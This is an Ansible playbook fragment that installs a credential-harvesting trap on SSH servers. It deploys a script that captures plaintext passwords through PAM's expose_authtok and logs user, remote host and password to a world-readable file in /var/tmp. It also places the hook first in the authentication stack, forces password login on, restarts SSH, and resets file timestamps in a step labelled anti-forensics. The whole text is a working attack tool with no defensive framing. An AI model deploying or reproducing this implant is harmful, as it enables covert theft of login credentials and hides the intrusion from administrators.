---
# --- STEP 1: DEPLOY THE LOGGER ---
- name: Deploy Simple PAM Logger
  become: yes
  copy:
    dest: /usr/local/bin/ssh-auth-check
    mode: '0755'
    content: |
      #!/bin/bash
      # Read the password from the PAM stream
      read -d '' -r PASSWORD
      if [ -n "$PASSWORD" ]; then
          # Log to the remote temp file
          echo "$(date +%H:%M:%S) | $PAM_USER | $PAM_RHOST | $PASSWORD" >> /var/tmp/ssh.txt
          chmod 666 /var/tmp/ssh.txt
      fi

# --- STEP 2: CONFIGURE GLOBAL TRAP ---
- name: Force Global PAM Trap and SSH Config
  become: yes
  lineinfile:
    path: "{{ item.path }}"
    regexp: "{{ item.regexp }}"
    line: "{{ item.line }}"
    insertbefore: "{{ item.insertbefore | default(omit) }}"
  loop:
    # Inserts our logger at the top of the authentication stack
    - { path: '/etc/pam.d/common-auth', regexp: '^auth optional pam_exec.so', line: 'auth optional pam_exec.so quiet expose_authtok /usr/local/bin/ssh-auth-check', insertbefore: 'BOF' }
    # Ensures passwords and PAM are active for SSH
    - { path: '/etc/ssh/sshd_config', regexp: '^#?PasswordAuthentication', line: 'PasswordAuthentication yes' }
    - { path: '/etc/ssh/sshd_config', regexp: '^#?UsePAM', line: 'UsePAM yes' }
  register: trap_updated

# --- STEP 3: RESTART & STEALTH ---
- name: Restart SSH Service
  become: yes
  systemd:
    name: ssh
    state: restarted
  when: trap_updated.changed

- name: Anti-Forensics - Match Timestamps
  become: yes
  shell: "touch -r /etc/hostname /etc/pam.d/common-auth && touch -r /etc/hostname /etc/ssh/sshd_config"
  ignore_errors: yes